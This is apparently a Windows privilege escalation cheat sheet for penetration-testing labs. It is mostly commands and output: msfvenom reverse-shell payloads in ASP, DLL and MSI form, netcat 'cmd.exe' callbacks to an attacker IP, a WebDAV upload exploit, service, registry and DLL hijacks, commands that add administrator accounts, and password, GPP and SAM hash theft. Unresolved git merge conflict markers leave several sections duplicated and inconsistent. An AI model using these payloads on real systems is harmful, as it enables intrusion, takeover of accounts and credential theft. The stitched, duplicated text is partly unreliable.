# Windows Privilege Escalation

### Resources
- http://www.fuzzysecurity.com/tutorials/16.html
- Metasploit meterpreter privilege escalation guide https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

### Enumeration
- `net user "%username"`
- try the `getsystem` command in meterpreter, rarely works but worth a shot: `meterpreter > getsystem`

- Generating a quick report without file upload
```
@echo --------- BASIC WINDOWS RECON ---------  > report.txt
timeout 1
net config Workstation  >> report.txt
timeout 1
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
timeout 1
hostname >> report.txt
timeout 1
net users >> report.txt
timeout 1
ipconfig /all >> report.txt
timeout 1
route print >> report.txt
timeout 1
arp -A >> report.txt
timeout 1
netstat -ano >> report.txt
timeout 1
netsh firewall show state >> report.txt
timeout 1
netsh firewall show config >> report.txt
timeout 1
schtasks /query /fo LIST /v >> report.txt
timeout 1
tasklist /SVC >> report.txt
timeout 1
net start >> report.txt
timeout 1
DRIVERQUERY >> report.txt
timeout 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
timeout 1
findstr /si password *.xml *.ini *.txt >> report.txt
timeout 1
reg query HKLM /f password /t REG_SZ /s >> report.txt
timeout 1
reg query HKCU /f password /t REG_SZ /s >> report.txt
timeout 1
dir "C:\"
timeout 1
dir "C:\Program Files\" >> report.txt
timeout 1
dir "C:\Program Files (x86)\"
timeout 1
dir "C:\Users\"
timeout 1
dir "C:\Users\Public\"
timeout 1
echo REPORT COMPLETE!
```

- Exploiting Windows Server 2003 and IIS 6.0 WEBDAV :
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

 cadavar http://$ip
 dav:/> put aspshell.txt
 Uploading aspshell.txt to `/aspshell.txt':
 Progress: [=============================>] 100.0% of 38468 bytes succeeded.
 dav:/> copy aspshell.txt aspshell3.asp;.txt
 Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
 dav:/> exit

 msf > use exploit/multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 msf exploit(handler) > set LHOST 1.2.3.4
 msf exploit(handler) > set LPORT 80
 msf exploit(handler) > set ExitOnSession false
 msf exploit(handler) > exploit -j

 curl http://$ip/aspshell3.asp;.txt

 [*] Started reverse TCP handler on 1.2.3.4:443
 [*] Starting the payload handler...
 [*] Sending stage (957487 bytes) to 1.2.3.5
 [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700
 ```

- to compile the python exploits using `PyInstaller`
 ```bash
 pip install pyinstaller
 wget -O exploit.py http://www.exploit-db/download/31853
 python pyinstaller.py --onefile exploit.py
 ```

- Windows Server 2003 and IIS 6.0 privilege escalation using Impersonation |  
Links: https://www.exploit-db.com/exploits/6705/ | https://github.com/Re4son/Churrasco

  ```
  c:\Inetpub>churrasco
  churrasco
  /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

  c:\Inetpub>churrasco -d "net user /add <username> <password>"
  c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
  c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
  ```

- Compiling MS11-080
```
python pyinstaller.py --onefile ms11-080.py
ms11-080.exe -O XP
```

- Executing a powershell script
```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```

- Powershell Privilege Escalation Tools https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

- **Running a command as a different user in Windows**
  - Sysinternals psexec
    - Prerequisites : username, password, nc.exe
    ```
    C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
    PsExec v2.2 - Execute processes remotely
    Copyright (C) 2001-2016 Mark Russinovich
    Sysinternals - www.sysinternals.com
    ```

  - Runas.exe
    - Prequisites : username, password
    ```
    C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
    Enter the password for Test:
    Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
    ```

  - Powershell script
    - Prequisites : powershell, username, password
    ```
    $username = '<username here>'
    $password = '<password here>'
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
    Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
    ```
    Then run this script using powershell.exe: </br>
    `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`


- Windows Service Configuration Viewer - Checks for misconfigurations in services that can lead to privilege escalation.
```
icacls scsiaccess.exe
scsiaccess.exe  
NT AUTHORITY\SYSTEM:(I)(F)  
BUILTIN\Administrators:(I)(F)  
BUILTIN\Users:(I)(RX)  
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
Everyone:(I)(F)
```

- Compile a custom add user command in windows using C
```
root@kali:~# cat useradd.c  
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
int main ()  
{  
int i;  
i=system ("net localgroup administrators low /add");  
return 0;  
}
```
`i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`

- Group Policy Preferences (GPP)
Found in modern domain environments

  - map the Domain Controller SYSVOL share </br>
  `net use z:\\dc01\SYSVOL`

  - Find the GPP file: Groups.xml
  `dir /s Groups.xml`

  - Review the contents for passwords
  `type Groups.xml`

  - Decrypt using GPP Decrypt
  `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`

- Find and display the proof.txt or flag.txt
```
meterpreter > run post/windows/gather/win_privs
meterpreter > cd\ & dir /b /s flag.txt
meterpreter > type c:\path-to\flag.txt
````

----------------------------------------------------------------------------------------

# Part - 2

### User accounts

- User accounts are used to log into a Windows system.
- Collection of settings/preferences bound to a unique identity

### Service accounts

- Service accounts are used to run services on Windows
- These can't be used to sign into a Windows system
- SYSTEM account is a default service account which has the **highest privilege** of any local account in Windows
- Other local service accounts include: NETWORK SERVICE, LOCAL SERVICE

### Groups

- User accounts can belong to multiple groups and groups can have multiple users
- Groups allow for easier access control to resources
- Regular groups (Administrators, Users) have a set list of members
- Pseudo groups (Authenticated Users) have a dynamic list of members, which changes based on certain conditions

### ACLs & ACEs

- Permissions to control a certain resource in Windows are controlled by the access control list (ACL) for that resource
- Each ACL is made up of zero or more access control entries (ACEs)
- Each ACE defines the relationship between a principal(user, group) and a certain access right

### RDP is present/can be enabled

- If RDP is available or can be enabled we can add our low privileged user to the administrators group and then spawn an administrator command prompt via the GUI

### Admin -> SYSTEM

- To escalate from Administrator to SYSTEM privileges, PsExec tool from Windows Sysinternals can be used : https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

### PowerUp and SharpUp

- Tools that hunt for specific privilege escalation misconfigurations
```
# start checking for common privilege escalation misconfigurations
PS> . .\PowerUp.ps1
PS> Invoke-AllChecks
```

### WinPEAS

```
# Before running the script we need to add a registry key and then reopen the command prompt
> reg add HKCU\Console /v VirtualTerminalLevel/t REG_DWORD /d 1

# running all checks while avoiding time-consuming searches
> .\winPEASany.exe quiet cmd fast

# running specific check categories
> .\winPEASany.exe quiet cmd systeminfo
```

### accesschk.exe

- accesschk.exe is a tool for checking user access control rights
- can be used to check if a user or group has access to files, directories, services and registry keys


### Kernel

- Core of the operating system
- Layer between application software and the actual computer hardware
- Kernel has complete control over the operating system, so exploiting a kernel vulnerability can result in execution as the SYSTEM user

### Privilege Escalation Steps for Windows 7

- Extract the output of the systeminfo command
```
> systeminfo > systeminfo.txt
```
- Run `wesng` to find potential exploits
```
python wesng.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```
- Cross reference results with compiled exploits
- Download the compiled exploit to the Windows VM
- Start a listener on attacking machine and run the exploit providing it with the reverse shell executable which should run with SYSTEM privileges
```
> .\exploit.exe C:\PrivEsc\reverse.exe
```

<<<<<<< HEAD
### Services
=======

### Services 
>>>>>>> 28d1126ec445ac0507b5c87e8137d14641c64ec0

- These are simply programs that run in the background, accepting input or performing regular tasks
- If services run with SYSTEM privileges are misconfigured, exploiting them may lead to command execution with SYSTEM privileges

### Service commands

```
# query the configuration of a service
> sc.exe qc <name>

# query the current status of a service
> sc.exe query <name>

# modify a configuration option of a service
> sc.exe config <name> <option>=<value>

# start/stop a service
> net start/stop <name>
```

### Service Miconfigurations

1. Insecure Service Properties
2. Unquoted Service Path
3. Weak registry permissions
4. Insecure service executables
5. DLL Hijacking

#### Insecure Service Properties
- Each service has an ACL which defines certain service-specific permissions
- Some permissions are innocuos(SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS), some may be useful(SERVICE_STOP), some are dangerous(SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG)

- **Potential Rabbit Hole** : If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges.

  - **Privilege Escalation Example**
  ```
  # 1. Run winPEAS to check for service misconfigurations
  > .\winpeas.exe quiet servicesinfo

  # 2. We can modify the "daclsvc" service
  # 3. We can confirm this with accesschk.exe
  > .\accesschk.exe /accepteula -uwcqv user daclsvc

  # 4. Check the current configuration of the service
  > sc qc daclsvc

  # 5. Check the current status of the service
  > sc query daclsvc

  # 6. Reconfigure the service to user our reverse shell executable
  > sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""

  # 7. Start a listener on attacking machine and then start the service to trigger the exploit
  > net start daclsvc
  ```

#### Unquoted Service Path

**Example:**

- the command `C:\Program Files\Some Dir\SomeProgram.exe` can be interpreted in two ways
  1. the execution of SomeProgram.exe
  2. C:\Program being an executable with arguments Files\Some and Dir\SomeProgram.exe

- Windows checks each possibility in turn
- **If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead


- **Privilege Escalation Example**
```
# 1. Run winPEAS to check for service misconfigurations
> .\winpeas.exe quiet servicesinfo

# 2. unquotedsvc service has an unquoted path that also contains spaces:
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

# 3. confirm this using sc:
> sc qc unquotedsvc

# 4. use accesschk.exe to check for write permissions
> .\accesschk.exe /accepteula -uwdq C:\
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

# 5. Copy the reverse shell executable and rename it appropriately
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

# 6. start a listener on attacking machine and then start the service to trigger the exploit
> net start unquotedsvc
```

#### Weak Registry Permissions

<<<<<<< HEAD
- Windows registry stores entries for each service
- Registry entries can have ACLs and if the ACL is misconfigured it may be possible to modify a service's configuration even if we cannot modify the service directly.

- **Privilege Escalation Example**
```
# 1. Run winPEAS for finding service misconfigurations
> .\winpeas.exe quiet servicesinfo

# 2. "regsvc" service has a weak registry entry. Confirming it with powershell
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
# OR use accesschk to confirm this
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

# 3. Overwrite the ImagePath registry key to point to our reverse shell executable
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# 4. Start a listener on the attacking machine and then start the service to trigger the exploit
=======
- If the ACL is misconfigured, it may be possible to modify a service's configuration even if we cannot modify the service directly. 

- **Privilege Escalation Example** 
```
# 1. Run winPEAS to check for service misconfigurations 
> .\winPEAS.exe quiet servicesinfo

# 2. the "regsvc" service has a weak registry entry. Can be confirmed using Powershell service has a weak registry entry. Can be confirmed using Powershell.
PS> Get-Acl HKLM:\System\CurrentcontrolSet\Services\regsvc | Format-List

# Or it can be confirmed using accesschk.exe
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

# 3. Overwrite the ImagePath Registry key to point to our reverse shell executable.
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# 4. Start a listener on attacking machine and then start the service to trigger the exploit: 
>>>>>>> 28d1126ec445ac0507b5c87e8137d14641c64ec0
> net start regsvc
```

#### Insecure Service Executables

<<<<<<< HEAD
- If the original service executable is modifiable by our user then we can simply replace it with our reverse shell executable

- **Privilege Escalation Example**
```
# 1. Run winpeas to check for service misconfigurations
> .\winpeas.exe quiet servicesinfo

# 2. "filepermsvc" service has an executable which appears to be writable by everyone. This can be confirmed with accesschk.exe
> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\fileperservice.exe"

# 3. Create a backup of the original service executable
> copy "C:\Program Files\File Permissions Service\filepermservice.exe" "C:\Temp"

# 4. Copy the reverse shell executable to overwrite the service executable:
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

# 5. Start a listener on attacking machine and start the service to trigger the exploit
=======
- If the original service executable is modifiable by our user, it can be simply replaced by the reverse shell executable. 

- **Privilege Escalation Example**
```
# 1. Run winPEAS to check for service misconfigurations 
> .\winpeas.exe quiet servicesinfo

# 2. "filepermsvc" services has an executable which appears to be writable by everyone 
> .\accesschk.exe /accepteula -quvw "C:\Progra Files\File Permissions Service\filepermservice.exe"

# 3. Create a backup of the original service executable 
> copy "C:\Program Files\Files Permissions Serivce\filepermservice.exe" C:\Temp

# 4. Copy the reverse shell executable to overwrite the service executable
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

# 5. Start a listener on the attacking machine and then start the service to trigger the shell
>>>>>>> 28d1126ec445ac0507b5c87e8137d14641c64ec0
> net start filepermsvc
```

#### DLL Hijacking

<<<<<<< HEAD
- DLL (dynamic-link library) are libraries which are used by services to load some functionality.
- Whatever functionality the DLL provides will be executed with the same privileges as the service that loaded it.
- **if DLL is loaded with absolute path, it might be possible to escalate privileges if that DLL is write by our user**

- Even if a DLL is missing from the system we can escalate privileges if our user has access to a directory within the PATH that windows searches for DLLs in.

- **Privilege Escalation Example**
```
# 1. use winpeas to enumerate non-windows services
> .\winpeas.exe quiet servicesinfo

# 2. C:\Temp directory is writable and is in the PATH. Enumerating which of these services our user has stop and start access to
> .\accesschk.exe /accepteula -uvqc user dllsvc

# 3. the "dllsvc" service is vulnerable to DLL Hijacking. According to the winpeas output, the service runs the dllhijackservice.exe executable. Can be confirmed manually by:
> sc qc dllsvc

# 4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the filter menu

# 5. Add a new filter on the Process Name matching dllhijackservice.exe

# 6. On the main screen, deselect the registry activity and network activity

# 8. Start the service
> net start dllsvc

# 8. "NAME NOT FOUND" errors appear in Procmon, associated with the hijackme.dll file

# 9. Windows tried to find the file in the C:\Temp directory, which as we found earlier is writable by our user

# 10. Generate a reverse shell DLL named hijackme.dll
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacking-ip> LPORT=53 -f dll -o hijackme.dll

# 11. Copy the DLL to the windows machine and into the C:\Temp directory. Start a listener on attacking machine and the stop/start the service to trigger the exploit
=======
- Services try to load the functionality from a library called a DLL. 
- Whatever functionality the DLL provides will be executed with the same privileges as the service that loaded it.
- If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

- if a DLL is missing from the system and the directory that it was supposed to be in, is writable by the user, then a reverse shell can be obtained by placing and renaming our reverse shell executable.

- **Privilege Escalation Example**
```
# 1. Use winPEAS to enumerate non-Windows services: 
> .\winpeas.exe quiet servicesinfo

# 2. C:\Temp directory is writable and is in the PATH. 
# start by enumerating which of these services our user has stop and start access to
> .\accesschk.exe /accepteula -uvqc user dllsvc

# 3. dllsvc service is vulnerable to DLL hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually. 
> sc qc dllsvc

# 4. Run procmon64.exe with administrator privileges. Press Ctrl+L to open the **filter** menu.

# 5. Add a new filter on the process name matching "dllhijacking.exe"

# 6. On the main screen, deselect registry activity and network activity

# 7. net start dllsvc

# 8. Back in procmon, note that a number of "NAME NOT FOUND" errors appear, associated with hijackme.dll file.

# 9. At some point, Windows tries to find the file in the C:\Temp directory which as we found earlier is writable by our user.

# 10. on attacking machine, generate a reverse shell DLL named hijackme.dll
~ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f dll -o hiijackme.dll

# 11. Copy the DLL to the windows VM and into the C:\Temp directory. Start a listener on the attacking machine and start/stop the service to trigger the exploit.
>>>>>>> 28d1126ec445ac0507b5c87e8137d14641c64ec0
> net stop dllsvc
> net start dllsvc
```

<<<<<<< HEAD
#### AutoRuns

- AutoRuns are configured in the registry
- works if we have the permission to write an AutoRun executable and restart the system(or wait for it to be restarted)

- **Privilege Escalation Example**
```
# 1. use winpeas to check for writable AutoRun executable
> .\winpeas.exe quiet applicationsinfo
# OR we can manually enumerate the AutoRun executables
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 2. using accesschk.exe to verify the permissions on each one
> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# 3. C:\Program Files\Autorun Program\program.exe is writable by everyone. Create a backup of the original
> copy "C:\Program Files\Autorun Program\program.exe" "C:\Temp"

# 4. copy our reverse shell executable to overwrite the Autorun executable
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"

# 5. start a listener on attacking machine and then restart the windows machine to trigger the exploit
=======
### Registry 

#### Autoruns 

- Windows can be configured to run commands at startup with elevated privileges. 
- These "Autoruns" can be configured in the registry
- If we have the permission to write to an AutoRun executable and are able to restrat the system or wait for it to be restarted, we may be able to escalate privileges

- **Privilege Escalation Examples**
```
# 1. Use winPEAS to check for writable AutoRun executable 
> .\winpeas.exe quiet applicationsinfo

# or we can manually enumerate Autorun executables
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# use accesschk.exe to verify the permissions on each one
> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# 2. The "C:\Program Files\Autorun Program\program.exe" Autorun executable is writable by everyone. Create a backup of the original

# 3. Copy the reverse shell executable to overwrite the Autorun executable

# 4. start listener on the attacking machine, and then restrat the windows machine to trigger the exploit. On Windows 10 the exploit appears to run with the privileges of the last logged in user, so log out the "user" account and log in as the "admin" account first.
>>>>>>> 28d1126ec445ac0507b5c87e8137d14641c64ec0
```

#### AlwaysInstallElevated

<<<<<<< HEAD
- MSI files are package files used to install applications
- These files run with the permissions of the user trying to install them
- Windows allows these installers to be run with elevated privileges
- Malicious MSI file can be generated and triggered to get a reverse shell

- **These two registry settings must be enabled for this to work**
- The "AlwaysInstallElevated" value must be set to 1 for both the local machine:
  1. HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
  and the current user:
  2. HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

- **Privilege Escalation Example**
```
# 1. use winpeas to see if both the registry settings are set:
> .\winpeas.exe quiet windowscreds
# verifying manually
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 2. Create a new reverse shell with msfvenom in msi format
~ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=53 -f msi -o reverse.msi

# 3. Copy the reverse.msi across to the windows vm, start a listener on attacking machine and run the installer to trigger the exploit
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```


### Passwords
=======
- Windows allows MSI files to be run with Admin privileges
- A malicious MSI file can be generated which will give us a reverse shell

**NOTE:**
- two registry settings must be enabled for this to work.
  1. HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
  2. HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

- **Privilege Escalation Example** 
```
# 1. use winPEAS to see if both registry values are set 
> .\winpeas.exe quiet windowscreds

# OR verify it manually
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 2. Create a new reverse shell with msfvenom, this time using the msi format and save it with .msi extension
~ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacking-ip> LPORT=<attacking-port> -f msi -o reverse.msi

# 3. Copy the reverse.msi across the Windows VM start a listener on attacking machine and run the installer to trigger the exploit
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

### Passwords

#### Searching the registry for passwords
```
> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s
```

- **Generating a shell using creds**
```
~ winexe -U 'admin%password123' //<victim-ip> cmd.exe
```

#### Looking for saved creds

- Windows has runas command which allows users to run commands with the privileges of other users
- This usually required the knowledge of other user's password
- Windows also allows other users to save their credentials to the system, and these saved credentials can be used to bypass the requirement.

- **Privilege Escalation Example** 
```
# 1. Use winPEAS to check for saved credentials
> .\winpeas.exe quiet cmd windowscreds

# 2. verify the creds manually using the command 
> cmdkey /list

# 3. if the saved creds aren't present run the following script to refresh the credential.
> C:\PrivEsc\savedcred.bat

# 4. we can use the saved credential to run any command as the admin user. Start the listener on attacking machine and run the reverse shell executable 
> runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

#### Configuration Files

- some administrators leave configuration files with passwords in them 
- 'unattend.xml' is an example of that

**Searching for configuration files**
```
# recursively search for files in the current directory with "pass" in the name, or ending with ".config"
> dir /s \*pass\* == \*.config

# recursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini or .txt
> findstr /si password *.xml *.ini *.txt
```

- **Privilege Escalation Example** 
```
# 1. use winpeas to search for common files which may contain credentials 
> .\winpeas.exe quiet cmd searchfast filesinfo

# 2. unattend.xml file was found

# 3. password for the admin user is found

# 4. use winexe on attacking machine to spawn a shell as admin user
```

#### SAM 

- Windows stores password hashes in the security account manager (SAM). 
- The hashes are encrypted with a key which can be found in a file named SYSTEM. 
- if we have the permissions to read the SAM and SYSTEM files we can extract password hashes.

- SAM and SYSTEM files are located in 
```
C:\Windows\System32\config
```
- Backups of these files may exist in 
```
C:\Windows\System32\config\RegBack
```

- **use creddump7/pwdump.py against SAM and SYSTEM files to extract the hashes**
```
~ python2 creddump7/pwdump.py SYSTEM SAM
```

>>>>>>> 28d1126ec445ac0507b5c87e8137d14641c64ec0
